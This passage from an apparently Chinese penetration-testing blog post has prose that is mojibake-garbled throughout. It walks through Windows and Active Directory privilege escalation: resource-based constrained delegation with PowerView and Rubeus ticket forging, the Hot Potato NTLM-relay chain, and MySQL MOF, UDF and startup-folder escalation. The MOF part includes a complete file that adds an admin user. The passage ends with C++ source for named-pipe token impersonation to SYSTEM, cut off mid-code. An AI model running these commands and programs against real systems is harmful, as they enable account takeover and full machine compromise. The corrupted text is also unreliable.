<pre><code class="language-çº¯æ–‡æœ¬">$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3298638106-3321833000-1571791979-1112)&quot;  
#è¿™å„¿çš„sidæ˜¯æˆ‘ä»¬åˆ›å»ºçš„#æœºå™¨ç”¨æˆ·#evilsystemçš„sid
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer WIN7| Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
</code></pre>
<p><img alt="QQæˆªå›¾20210217140726" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQæˆªå›¾20210217140726.png" title="QQæˆªå›¾20210217140726" /></p>
<p>è‡³äºæœºå™¨è´¦æˆ·SIDæ€ä¹ˆè·å¾—ï¼Œpowerviewä¸‹çš„ <code>get-domiancomputer hacksystem</code>
ç„¶åä½¿ç”¨<code>Get-DomainComputer WIN7 -Properties msds-allowedtoactonbehalfofotheridentity</code> æŸ¥çœ‹å§”æ´¾æ˜¯å¦è®¾ç½®æˆåŠŸ</p>
<p><code>Set-DomainObject win7 -Clear 'msds-allowedtoactonbehalfofotheridentity' -Verbose</code>æ­¤å‘½ä»¤å¯ä»¥æ¸…é™¤ msds-allowedtoactonbehalfofotheridentityå±æ€§çš„å€¼</p>
<p>ç°åœ¨éƒ½ç»Ÿç»Ÿè®¾ç½®å¥½äº†ï¼Œå¼€å§‹ä¸‹ä¸€æ­¥å§ã€‚
ç½‘ä¸Šä¸€èˆ¬ç”¨çš„rubeusï¼Œè¿™é‡Œæˆ‘ç”¨kekeoå§</p>
<pre><code class="language-çº¯æ–‡æœ¬">Rubeus.exe hash /user:xxx /password:xxx /domain:xxx
</code></pre>
<p>æœ¬åœ°è¿ç®—å‡ºæœºå™¨ç”¨æˆ·ntlm hash è¿™é‡Œå€Ÿç”¨ä¸€ä¸‹åˆ«äººçš„å›¾</p>
<p><img alt="QQæˆªå›¾20210217140944" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQæˆªå›¾20210217140944.png" title="QQæˆªå›¾20210217140944" /></p>
<p><code>Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:cifs/dm2008 /ptt</code> å†™å…¥ç¥¨æ®</p>
<p>ç„¶åæˆ‘åœ¨æœ¬æœºä½¿ç”¨ä»¥ä¸Šæ–¹æ³•åklistä¸€ä¸‹ï¼Œå‘ç°ç¡®å®å­˜åœ¨ç¥¨æ®</p>
<p><img alt="QQæˆªå›¾20210217140737" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQæˆªå›¾20210217140737.png" title="QQæˆªå›¾20210217140737" /></p>
<p>ä½†æ˜¯dir \test1\c\$æ—¶æœ¬æœºè«åå…¶å¦™ä¸èƒ½è¿›è¡ŒkerberoséªŒè¯ï¼Œæˆ‘æœäº†ã€‹ã€‚ã€‚ä½†ä¸ç®¡æ€æ ·ï¼Œæˆ‘ä»¬æ‹¿åˆ°é“¶ç¥¨äº†</p>
<h4 id="_7">æ•æ„Ÿç”¨æˆ·ä¸å¯å§”æ´¾çš„ç»•è¿‡</h4>
<p><img alt="QQæˆªå›¾20210217141050" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQæˆªå›¾20210217141050.png" title="QQæˆªå›¾20210217141050" /></p>
<p>è‹¥æˆ‘ä»¬çš„administratorç”¨æˆ·è¢«è®¾ç½®ä¸ºæ•æ„Ÿç”¨æˆ·ä¸å¯å§”æ´¾æˆ–è€…è¢«åŠ å…¥ä¿æŠ¤ç»„ï¼ŒæŒ‰ç†è¯´ä»–çš„è®¿é—®å°±ä¸èƒ½è¿›è¡Œå§”æ´¾ã€‚</p>
<p>æˆ‘ä»¬åœ¨ä»¥administratorè´¦æˆ·èº«ä»½è¿›è¡ŒS4Uæ—¶ï¼Œåªèƒ½è¿›è¡ŒS4U2SELFï¼Œä¸èƒ½è¿›è¡ŒS4U2PROXYã€‚æˆ‘ä»¬ç”¨ <code>Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:cifs/dm2008 /ptt</code>ç»§ç»­å®éªŒadministratorï¼Œå‘ç°ç¡®å®æ˜¯è¿™æ ·</p>
<p><img alt="QQæˆªå›¾20210217141131" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQæˆªå›¾20210217141131.png" title="QQæˆªå›¾20210217141131" /></p>
<p>æ­¤æ—¶æˆ‘ä»¬ç”¨ rubeus.exe describe /ticker:S4Ubase64åŠ å¯†çš„ç¥¨æ®</p>
<p><img alt="QQæˆªå›¾20210217141313" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQæˆªå›¾20210217141313.png" title="QQæˆªå›¾20210217141313" /></p>
<p>å¯ä»¥å‘ç°servicenameå¹¶æ²¡æœ‰æŒ‡å®šæŸä¸ªæœåŠ¡ï¼Œä»…ä»…åªæœ‰ä¸€ä¸ªè´¦æˆ·.å³å‘ç”Ÿäº†æœåŠ¡åç§°ç¼ºå¤±çš„é—®é¢˜ã€‚å¾ˆç®€å•ï¼ŒæŠŠç¥¨æ®ä¿®æ”¹ä¸€ä¸‹å°±è¡Œäº†.ç½‘ä¸Šå¾ˆå¤šè¯´ç”¨è¿™ä¸ªå·¥å…·
<a href="https://www.pkisolutions.com/tools/asn1editor/" title="https://www.pkisolutions.com/tools/asn1editor/">https://www.pkisolutions.com/tools/asn1editor/</a>
ä½†å®é™…ä¸Šrubeusä¹Ÿèƒ½å®Œæˆç¥¨æ®ä¿®æ”¹<code>rubeus.exe tgssub /ticket:xxx /altservice:cifs/test1 /ptt</code></p>
<p><img alt="QQæˆªå›¾20210217141325" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQæˆªå›¾20210217141325.png" title="QQæˆªå›¾20210217141325" /></p>
<p><img alt="QQæˆªå›¾20210217141339" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQæˆªå›¾20210217141339.png" title="QQæˆªå›¾20210217141339" /></p>
<p>å®Œäº‹</p>
<h2 id="potato">POTATO å®¶æ—</h2>
<h3 id="hot-potato">hot potato</h3>
<p>çƒ­åœŸè±†ææƒã€‚å¾ˆæ—©å‰å°±å¬è¯´è¿‡äº†ï¼Œä½†ä¸€ç›´æ²¡å»äº†è§£è¿‡ã€‚å‰ç½®çŸ¥è¯†æ˜¯ntlm relay,å¯ä»¥å»äº†è§£äº†è§£ã€‚ potatoå®¶æ—æœ‰å¾ˆå¤šï¼Œhot potatoåªæ˜¯å…¶ä¸­ä¸€ç§ææƒæ–¹å¼ã€‚
æˆ‘ç¯å¢ƒæœ‰é—®é¢˜ï¼Œä¸èƒ½å¾ˆå¥½çš„å¤ç°ğŸ™ƒï¼ŒæŠ“åŒ…åˆ†æå•¥çš„å…ˆå’•å’•å§ã€‚</p>
<p><a href="https://github.com/foxglovesec/PotatoğŸ‘ˆå·¥å…·" title="https://github.com/foxglovesec/PotatoğŸ‘ˆå·¥å…·">https://github.com/foxglovesec/PotatoğŸ‘ˆå·¥å…·</a>
<a href="https://foxglovesecurity.com/2016/01/16/hot-potato/" title="https://foxglovesecurity.com/2016/01/16/hot-potato/">https://foxglovesecurity.com/2016/01/16/hot-potato/</a> ğŸ‘ˆHOT POTATOæŠ€æœ¯æ–‡æ¡£ï¼Œå›½å†…åŸºæœ¬ä¸Šç¿»è¯‘è¿™ä¸ªæ¥çš„ã€‚</p>
<p>ææƒæ­¥éª¤å¤§æ¦‚æ˜¯è¿™ä¸ªæµç¨‹
1.æœ¬åœ°nbnsæœåŠ¡æ¬ºéª—
2.wpadåŠ«æŒ
3.HTTP-&gt;SMB çš„ ntlm relay</p>
<p>1.æœ¬åœ°nbnsæœåŠ¡æ¬ºéª—</p>
<p>WindowsåŸŸåè§£æè§„åˆ™æ˜¯
æœ¬åœ°HOSTæ–‡ä»¶-ã€‹dnsæŸ¥è¯¢-ã€‹NBNSæˆ–è€…LLMNRæŸ¥è¯¢
ä¸€æ—¦æœ¬åœ°å‘å‡ºNBNSæŸ¥è¯¢ï¼Œæˆ‘ä»¬æœ¬åœ°å°±å¯ä»¥è¿…é€Ÿå“åº”ï¼Œå•ªçš„ä¸€ä¸‹å°±å“åº”äº†ï¼Œå¾ˆå¿«å•Šï¼Œæœ¬åœ°å‘åŒ…å¾ˆå¿«ï¼Œåªè¦å‘å‡ºNBNSåŒ…åŸºæœ¬ä¸Šéƒ½èƒ½è¢«æˆ‘ä»¬æœ¬åœ°å‘åŒ…å“åº”ã€‚
ä½†æ˜¯ä»¥ä¸Šæ­¥éª¤è¿˜æ˜¯æœ‰ä¸€äº›ç»†èŠ‚çš„ï¼šæˆ‘ä»¬å½“å‰å¹¶éç®¡ç†å‘˜æƒé™ï¼Œå¤§å‡ ç‡æ˜¯æ— æ³•å—…æ¢æœ¬åœ°æµé‡çš„,å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿäº‹å…ˆçŸ¥é“ç›®æ ‡ä¸»æœºæœŸæœ›NBNSæŸ¥è¯¢è·å¾—çš„ä¸»æœºåï¼Œæˆ‘ä»¬å¯ä»¥ä¼ªé€ ä¸€ä¸ªå“åº”ï¼Œå¯¹å‘é€NBNSæŸ¥è¯¢çš„é‚£ä¸ªä¸»æœºå¿«é€Ÿçš„å¤§é‡å‘é€NBNSå“åº” .ä½†æ˜¯nbnsæµé‡åŒ…è¿˜æœ‰ä¸ªå«ç‰¹å¾ç çš„ä¸œè¥¿ï¼Œè¯·æ±‚åŒ…å’Œå“åº”åŒ…çš„ç‰¹å¾ç å¿…é¡»ç›¸åŒï¼Œæ‰€ä»¥æˆ‘ä»¬è¢«è¿«å‘é€65536ä¸ªåŒ…çˆ†ç ´è¿™ä¸ªç‰¹å¾ç â€”â€”æœ¬åœ°å‘åŒ…é€Ÿåº¦å¾ˆå¿«ï¼Œæœ¬åœ°NBNSæ¬ºéª—æˆåŠŸç‡åŸºæœ¬ä¸Šåœ¨100%ã€‚</p>
<p>2.WPADåŠ«æŒ</p>
<p>NBNSæ¬ºéª—åæˆ‘ä»¬å°±å¯ä»¥åŠ«æŒWPADçš„åŸŸåï¼ŒæŠŠè‡ªå·±ä¼ªé€ ç§°WPADå¹¶è¿”å›è‡ªå®šä¹‰çš„PACæ–‡ä»¶ã€‚æ„å‘³ç€æˆ‘ä»¬å¯ä»¥æŠŠæœ¬åœ°å‘å‡ºçš„æ‰€æœ‰æµé‡é‡å®šå‘ã€‚</p>
<p>3.RELAY</p>
<p>åœ¨ç°åœ¨è¿™ä¸ªå¹´ä»£ï¼ŒSMB-&gt;SMBçš„relayå¾ˆå°‘ç”¨åˆ°äº†ï¼Œå¾®è½¯ ç¦ç”¨äº†åŒåè®®çš„NTLMè®¤è¯ ï¼ŒæˆåŠŸç‡å¾ˆä½ã€‚
ä½†æ˜¯HTTP-&gt;SMBçš„relayè¿˜æ˜¯æœ‰çš„ã€‚HOT POTATOå°±æ˜¯åˆ©ç”¨çš„è¿™ä¸€ç‚¹ã€‚
æˆ‘ä»¬å¯ä»¥æŠŠä¸»æœºå‘å‡ºçš„HTTPè¯·æ±‚é‡å®šå‘åˆ°æˆ‘ä»¬è‡ªå®šä¹‰çš„ç½‘é¡µAï¼Œè€Œç½‘é¡µAéœ€è¦NTLMè®¤è¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥è¿›è¡ŒHTTP-&gt;SMBçš„relayâ€™äº†ã€‚å½“HTTPè¯·æ±‚æ¥è‡ªäºé«˜æƒé™çš„è´¦æˆ·æ—¶ï¼Œä¾‹å¦‚æ˜¯æ¥è‡ªwindows æ›´æ–°æœåŠ¡çš„è¯·æ±‚ï¼Œå‘½ä»¤å°±ä¼šä»¥â€NT AUTHORITY\SYSTEMâ€æƒé™è¿è¡Œã€‚</p>
<p>HOT POTATO æ ¹æ®Windowsç‰ˆæœ¬çš„ä¸åŒï¼Œéœ€è¦ç­‰å¾…é«˜æƒé™ç”¨æˆ·NTLMè®¤è¯æ¥åˆ°çš„æ—¶é—´ä¹Ÿä¸åŒã€‚ä¸€èˆ¬æ¥è¯´ï¼Œ
WIN7æ˜¯ç¬é—´å°±å¯ä»¥ææƒçš„
Windows Server 2012 R2,Windows Server 2012,Windows 8.1,Windows 8æœ‰ä¸€ä¸ªè‡ªåŠ¨æ›´æ–°æœºåˆ¶ï¼Œä¼šæ¯å¤©ä¸‹è½½è¯ä¹¦ä¿¡ä»»åˆ—è¡¨(CTLs)
,etc</p>
<h2 id="mysql">MYSQLä¸‹çš„ææƒæŠ€æœ¯</h2>
<h3 id="mof">MOFææƒ</h3>
<p>åœ¨c:/windows/system32/wbem/mof/ç›®å½•ä¸‹çš„nullevt.mofæ¯åˆ†é’Ÿéƒ½ä¼šæœ‰ä¸€ä¸ªç‰¹å®šçš„æ—¶é—´å»æ‰§è¡Œä¸€æ¬¡ï¼ˆç”±â€And TargetInstance.Second = 5â€³;æ§åˆ¶ï¼Œè¿™é‡Œè¾“å…¥5å°±æ˜¯æ¯åˆ†é’Ÿçš„ç¬¬äº”ç§’æ‰§è¡Œã€‚ é‚£ä¹ˆæŠŠcmdå‘½ä»¤æ·»åŠ åˆ°nullevt.mofä¸­ï¼Œcmdå‘½ä»¤å°±ä¼šè‡ªåŠ¨æ‰§è¡Œäº†ã€‚</p>
<p>å‰ææ˜¯æˆ‘ä»¬è¦èƒ½è¿›å…¥æ•°æ®åº“è¿›è¡Œæ“ä½œï¼Œä¸”mysqlæ•°æ®åº“çš„æƒé™å°½å¯èƒ½é«˜æ‰æ›´æœ‰åˆ©ã€‚åŒæ—¶secure-file-priv è¦ä¸ºç©ºï¼ˆ mysql 5.6.34ç‰ˆæœ¬ä»¥å secure_file_privçš„å€¼é»˜è®¤ä¸ºNULL,ç¦æ­¢æ‰€æœ‰æ–‡ä»¶å¯¼å…¥å¯¼å‡ºåŠŸèƒ½ï¼‰</p>
<p>æˆ‘ä»¬ä¼ªé€ çš„MOFæ–‡ä»¶æ ¼å¼å¦‚ä¸‹</p>
<pre><code class="language-çº¯æ–‡æœ¬">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;) 

instance of __EventFilter as $EventFilter 
{ 
    EventNamespace = &quot;Root\\Cimv2&quot;; 
    Name  = &quot;filtP2&quot;; 
    Query = &quot;Select * From __InstanceModificationEvent &quot; 
            &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot; 
            &quot;And TargetInstance.Second = 5&quot;; 
    QueryLanguage = &quot;WQL&quot;; 
}; 

instance of ActiveScriptEventConsumer as $Consumer 
{ 
    Name = &quot;consPCSV2&quot;; 
    ScriptingEngine = &quot;JScript&quot;; 
    ScriptText = 
    &quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user admin admin /add\&quot;)&quot;;   //ä¿®æ”¹æ­¤å¤„å³å¯
}; 

instance of __FilterToConsumerBinding 
{ 
    Consumer   = $Consumer; 
    Filter = $EventFilter; 
}; 
</code></pre>
<p>ä¿®æ”¹ä¸Šé¢çš„cmdéƒ¨åˆ†å³å¯å®ç°ä»¥ç®¡ç†å‘˜èº«ä»½æ‰§è¡Œå„ç§å‘½ä»¤ã€‚
ç„¶åæˆ‘ä»¬ä½¿ç”¨mysqlä¸‹çš„å‘½ä»¤ ï¼Œå°†mofè¦†ç›–è¿‡å»ã€‚
å¾…æˆ‘ä»¬çš„å‘½ä»¤è¢«æ‰§è¡Œåï¼Œå³ä»£è¡¨ææƒæˆåŠŸã€‚
Windows 2003ä¼¼ä¹æˆåŠŸç‡è›®é«˜çš„ï¼ŒWIN7è¯•äº†è¯•æ²¡ååº”ã€‚ã€‚ã€‚</p>
<h3 id="udf">UDFææƒ</h3>
<p>ï¼ˆè¿™ä¸ªä¹Ÿå¯ä»¥linuxææƒ</p>
<p>udfï¼Œå³è‡ªå®šä¹‰å‡½æ•°ï¼ˆuser define functionï¼‰</p>
<p>MYSQLå¯ä»¥è‡ªå®šä¹‰å‡½æ•°çš„ã€‚è‡ªå®šä¹‰å‡½æ•°åœ¨Windowsä¸‹æ˜¯ä»¥DLLæ–‡ä»¶å­˜åœ¨äºMYSQLçš„æ’ä»¶æ–‡ä»¶å¤¹é‡Œé¢çš„ï¼ˆlinuxåˆ™æ˜¯ä»¥osçš„å½¢å¼ï¼‰ã€‚æˆ‘ä»¬å¯ä»¥è‡ªå®šä¹‰ä¸€ä¸ªæ¶æ„dllï¼Œé‡Œé¢å­˜æ”¾ç€å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„ å‡½æ•°ã€‚ç„¶åäº¤ç»™mysqlä»¥æ•°æ®åº“æƒé™æ‰§è¡Œã€‚</p>
<p>å‰æï¼šæˆ‘ä»¬èƒ½æ“ä½œæ•°æ®åº“ï¼Œä¸”æ•°æ®åº“æƒé™å¿…é¡»å¾ˆé«˜ï¼ˆæˆ‘ä»¬ç”¨è¿™ä¸ªæ–¹æ³•ææƒåˆ°çš„æƒé™å°±æ˜¯æ•°æ®åº“çš„æƒé™</p>
<p>é‚£ä¹ˆè¿™ä¸ªdllæ–‡ä»¶å“ªé‡Œæ¥å‘¢ã€‚sqlmapå’Œmsféƒ½æœ‰ã€‚sqlmapä¸‹çš„ sqlmap/data/udf/mysql/windows/64/lib_mysqludf_sys.dll_ å°±æ˜¯è¿™ä¸ªdllæ–‡ä»¶çš„ç¼–ç ç‰ˆæœ¬ã€‚æˆ‘ä»¬ä½¿ç”¨sqlmapä¸‹çš„sqlmap/extra/cloak/cloak.pyå¯¹å…¶è¿›è¡Œè§£ç è·å¾—dllæ–‡ä»¶ã€‚</p>
<pre><code class="language-çº¯æ–‡æœ¬">python ./cloak.py -d -i ./lib_mysqludf_sys.dll_  å³å¯è·å¾—dllæ–‡ä»¶
</code></pre>
<p>ç„¶åæˆ‘ä»¬æŠŠdllæ–‡ä»¶æ”¾å…¥mysqlçš„æ’ä»¶æ–‡ä»¶å¤¹ï¼Œå‘½åä¸ºudf.dllã€‚æ’ä»¶æ–‡ä»¶å¤¹å¯ä»¥é€šè¿‡å‘½ä»¤</p>
<pre><code class="language-çº¯æ–‡æœ¬">show variables like &quot;%plugin%&quot;;è·å¾—  ï¼ˆ/lib/pluginæ–‡ä»¶å¤¹éœ€è¦è‡ªå·±åˆ›å»ºï¼‰
</code></pre>
<p>è‡³äºæ€ä¹ˆæŠŠdllæ”¾å…¥æ’ä»¶æ–‡ä»¶å¤¹</p>
<p>1.ç›´æ¥ç²˜è´´å¤åˆ¶ ï¼ˆæƒé™å¯èƒ½ä¸å¤Ÿ
2.ä½¿ç”¨å‘½ä»¤ select load_file(â€˜udf.dllâ€™) into dumpfile â€œPLUGINçš„è·¯å¾„â€;(éœ€è¦secure_file_privä¸ºç©º</p>
<p>æ€»ä¹‹ï¼Œå¦‚æœæŠŠudf.dllæ”¾å…¥pluginæ–‡ä»¶å¤¹åï¼Œæˆ‘ä»¬å°±å¯ä»¥æ‰§è¡Œä»¥ä¸‹æ“ä½œææƒäº†ã€‚</p>
<pre><code class="language-çº¯æ–‡æœ¬">create funtion sys_eval returns string soname &quot;udf.dll&quot;;
select sys_eval('cmd');
</code></pre>
<p><img alt="QQæˆªå›¾20210217144509" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQæˆªå›¾20210217144509.png" title="QQæˆªå›¾20210217144509" /></p>
<h3 id="_8">å¯åŠ¨é¡¹ææƒ</h3>
<p>è¯´ç™½äº†ï¼Œå°±æ˜¯é€šè¿‡mysqlçš„é«˜æƒé™ï¼Œå‘windowså¼€æœºå¯åŠ¨é¡¹æ–‡ä»¶å¤¹é‡Œæ”¾å…¥æ¶æ„vbsæˆ–è€…batè„šæœ¬,æœºå™¨é‡å¯åè‡ªåŠ¨æ‰§è¡Œã€‚æ€ä¹ˆè®©æœºå™¨é‡å¯ï¼Ÿç­‰ç®¡ç†å‘˜æˆ–è€… ä¸€äº›å¯å¯¼è‡´æœåŠ¡å™¨è“å±çš„EXP
å¯åŠ¨é¡¹è·¯å¾„ä¸€èˆ¬ä¸ºï¼š
C:\Documents and Settings\All Users\ã€Œå¼€å§‹ã€èœå•\ç¨‹åº\å¯åŠ¨
C:\Users\username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</p>
<pre><code class="language-çº¯æ–‡æœ¬">select load_file(&quot;xxx&quot;) into dumpfile &quot;xxxx&quot;;
</code></pre>
<p><img alt="QQæˆªå›¾20210217144534" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQæˆªå›¾20210217144534.png" title="QQæˆªå›¾20210217144534" /></p>
<p>æ²¡ä»€ä¹ˆå¥½è¯´çš„</p>
<h2 id="_9">å‘½åç®¡é“ææƒ</h2>
<p>ææƒæ–¹å¼ä¸º ä»¤ç‰Œæ¨¡ä»¿ã€‚ Token Impersonation .</p>
<p>meterpreterçš„getsystemçš„æå–æ–¹æ³•ä¹‹ä¸€å°±æ˜¯è¿™ä¸ªæ–¹æ³•</p>
<p>ææƒè¿‡ç¨‹ä¸ºä»administratorç”¨æˆ·æåˆ°SYSTEMæƒé™ã€‚ä»æ™®é€šç”¨æˆ·ææƒåˆ°adminåŠä»¥ä¸Šæƒé™æ˜¯ä¸å¯å–çš„ï¼Œå› ä¸ºæ™®é€šç”¨æˆ·åˆ›å»ºçš„å‘½åç®¡é“æ²¡æœ‰ <code>SeImpersonatePrivilege</code>ï¼Œåœ¨å¤åˆ¶ä»¤ç‰Œæ—¶ä¼šå‡ºç°1346é”™è¯¯ã€‚</p>
<p>è¯¥æ–¹æ³•æŠ€æœ¯ç»†èŠ‚ä¸ºï¼šä»¥ç®¡ç†å‘˜æƒé™åˆ›å»ºä¸€ä¸ªå‘½åç®¡é“ï¼Œå†é€šè¿‡åˆ›å»ºSYSTEMæƒé™æœåŠ¡ï¼Œè®©æœåŠ¡è¿ä¸Šå‘½åç®¡é“ï¼Œéšåæˆ‘ä»¬é€šè¿‡æ¨¡æ‹Ÿå®¢æˆ·ç«¯ï¼Œè·å¾—SYSTEMæƒé™çš„ä»¤ç‰Œï¼Œéšåå°†å…¶å¤åˆ¶ï¼Œå†ç”¨å¤åˆ¶åçš„ä»¤ç‰Œåˆ›å»ºæ–°è¿›ç¨‹ï¼ˆå¦‚CMD)ï¼Œæ–°è¿›ç¨‹çš„æƒé™å³SYSTEMæƒé™ã€‚</p>
<p>è¿™é‡Œè´´ä¸Šå®ç°ä»£ç .
é¦–å…ˆæ˜¯è¢«åˆ›å»ºçš„æœåŠ¡çš„å®ç°ä»£ç ï¼Œè¯¥æœåŠ¡å¯åŠ¨åä¼šä¸æ–­å‘æœåŠ¡å™¨å‘½åç®¡é“å»ºç«‹é“¾æ¥
ç”Ÿæˆå¥½åï¼Œæ˜¯Service.exe</p>
<pre><code class="language-çº¯æ–‡æœ¬">#include&lt;Windows.h&gt;
#include&lt;iostream&gt;
SERVICE_STATUS m_ServiceStatus;
SERVICE_STATUS_HANDLE m_ServiceStatusHandle;
BOOL bRunning;
void WINAPI ServiceMain(DWORD argc, LPTSTR* argv);
void WINAPI HandlerFunc(DWORD code);
int main() {
  WCHAR Servicename[] = L&quot;ServiceA&quot;;
  SERVICE_TABLE_ENTRY Table[] = { {Servicename,ServiceMain},{NULL,NULL} };
  StartServiceCtrlDispatcher(Table);
}

void WINAPI ServiceMain(DWORD argc, LPTSTR* argv) {


  m_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
  m_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
  m_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
  m_ServiceStatus.dwWin32ExitCode = 0;
  m_ServiceStatus.dwServiceSpecificExitCode = 0;
  m_ServiceStatus.dwCheckPoint = 0;
  m_ServiceStatus.dwWaitHint = 0;

  m_ServiceStatusHandle = RegisterServiceCtrlHandler(L&quot;ServiceA&quot;, HandlerFunc);
  m_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
  m_ServiceStatus.dwCheckPoint = 0;
  m_ServiceStatus.dwWaitHint = 0;
  SetServiceStatus(m_ServiceStatusHandle, &amp;m_ServiceStatus);
  bRunning = true;
  while (bRunning) {
  LPCWSTR PipeName = L&quot;\\\\.\\pipe\\testpipe&quot;;
  HANDLE PipeHandle=NULL;
  BOOL PipeInstance;
  WCHAR message[512] = { 0 };
  DWORD bytesWritten = 0;
  BOOL Flag = true;
  wchar_t message2[] = L&quot;HELL&quot;;
  DWORD messageLength = lstrlen(message2) * 2;
  do {
    PipeHandle = CreateFile(PipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
  } while (PipeHandle == INVALID_HANDLE_VALUE);

  WriteFile(PipeHandle, &amp;message2, messageLength, &amp;bytesWritten, NULL);

  Flag = ReadFile(PipeHandle, &amp;message, 512, &amp;bytesWritten, NULL);
  std::cout &lt;&lt; &quot;Message:&quot; &lt;&lt; message &lt;&lt; std::endl;
  }
}

void WINAPI HandlerFunc(DWORD code) {
  switch (code) {
  case SERVICE_CONTROL_PAUSE:
    m_ServiceStatus.dwCurrentState = SERVICE_PAUSED;
    break;
  case SERVICE_CONTROL_CONTINUE:
    m_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    break;
  case SERVICE_CONTROL_STOP:
    m_ServiceStatus.dwWin32ExitCode = 0;
    m_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    m_ServiceStatus.dwCheckPoint = 0;
    m_ServiceStatus.dwWaitHint = 0;

    SetServiceStatus(m_ServiceStatusHandle, &amp;m_ServiceStatus);
    bRunning = false;
    break;
  case SERVICE_CONTROL_INTERROGATE:
    break;
  }
}
</code></pre>
<p>ç„¶åæ˜¯ä¸»ä½“ï¼Œå‘½åç®¡é“æœåŠ¡å™¨ã€‚ç”Ÿæˆåæ˜¯Server.exe</p>
<pre><code class="language-çº¯æ–‡æœ¬">  #include&lt;Windows.h&gt;
  #include&lt;iostream&gt;

  int main() {
    LPCWSTR pipeName = L&quot;\\\\.\\pipe\\testpipe&quot;;
    LPVOID pipeBuffer = NULL;
    HANDLE serverPipe;
    DWORD readBytes = 0;
    DWORD readBuffer = 0;
    int err = 0;
    BOOL isPipeConnected;
    BOOL isPipeOpen;
    wchar_t message[] = L&quot;HELL&quot;;
    DWORD messageLenght = lstrlen(message) * 2;
    DWORD bytesWritten = 0;
    WCHAR message2[512] = { 0 };
  //Open a Named Pipe,Wait for a connection
    std::wcout &lt;&lt; &quot;Creating named pipe &quot; &lt;&lt; pipeName &lt;&lt; std::endl;
    serverPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL);

  //Create a service of system to connect to our NamedPipe.

    char servicename[] = &quot;Service.exe&quot;;
    char servicepath[_MAX_PATH];
    SERVICE_STATUS status;
    GetModuleFileNameA(LoadLibraryA(servicename), servicepath, sizeof(servicepath));
    SC_HANDLE scManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
    if (GetLastError() == 0) {

    }
    else {
      std::cout &lt;&lt; &quot;ERROR OpenSCManager:&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;
    }
    SC_HANDLE scService = CreateServiceA(scManager, servicename, servicename,
      SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
      servicepath, NULL, NULL, NULL, NULL, NULL);
    if (!scService) {
      if (GetLastError() == 1073) {
        std::cout &lt;&lt; &quot;The Service has been exsisted&quot; &lt;&lt; std::endl;
      }
      else {
        std::cout &lt;&lt; &quot;ERROR CreateServiceA:&quot; &lt;&lt; GetLastError() &lt;&lt; std::endl;
      }
    }
    SC_HANDLE scServiceA = OpenServiceA(scManager, servicename, SERVICE_ALL_ACCESS);
    if (StartService(scServiceA, 0, NULL)) {
      std::cout&lt;&lt;&quot;service Start success&quot;&lt;&lt;std::endl;
    }
    else {
      if (GetLastError() == 1056) {
        std::cout &lt;&lt; &quot;service is running,don't need to start again&quot; &lt;&lt; std::endl;
      }
    }
  //Connect !
    isPipeConnected = ConnectNamedPipe(serverPipe, NULL);

    if (isPipeConnected) {
      std::wcout &lt;&lt; &quot;Incoming connection to &quot; &lt;&lt; pipeName &lt;&lt; std::endl;
      ReadFile(serverPipe, &amp;message2, 512, &amp;bytesWritten, NULL);
      std::cout &lt;&lt; message2;
    }
    else {
      std::cout &lt;&lt; &quot;Does not connected Error: &quot;&lt;&lt;GetLastError() &lt;&lt; std::endl;
    }

    std::wcout &lt;&lt; &quot;Sending message: &quot; &lt;&lt; message &lt;&lt; std::endl;
    WriteFile(serverPipe, message, messageLenght, &amp;bytesWritten, NULL);
  //Toekn Impersonation
    std::wcout &lt;&lt; &quot;Impersonating the client...&quot; &lt;&lt; std::endl;
    if (!ImpersonateNamedPipeClient(serverPipe)) {
      std::cout&lt;&lt;&quot;ImpersonateNamedPipeClient ERROR: &quot;&lt;&lt;GetLastError()&lt;&lt;std::endl;
    }
    else {
    std::cout &lt;&lt; &quot;ImpersonateNamedPipeClient success&quot; &lt;&lt; std::endl;
    }

    STARTUPINFOA si;
    PROCESS_INFORMATION pi = {};
    ZeroMemory(&amp;pi, sizeof(pi));
    ZeroMemory(&amp;si, sizeof(si));
    si.cb = sizeof(si);
    HANDLE token;
    if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &amp;token)) {
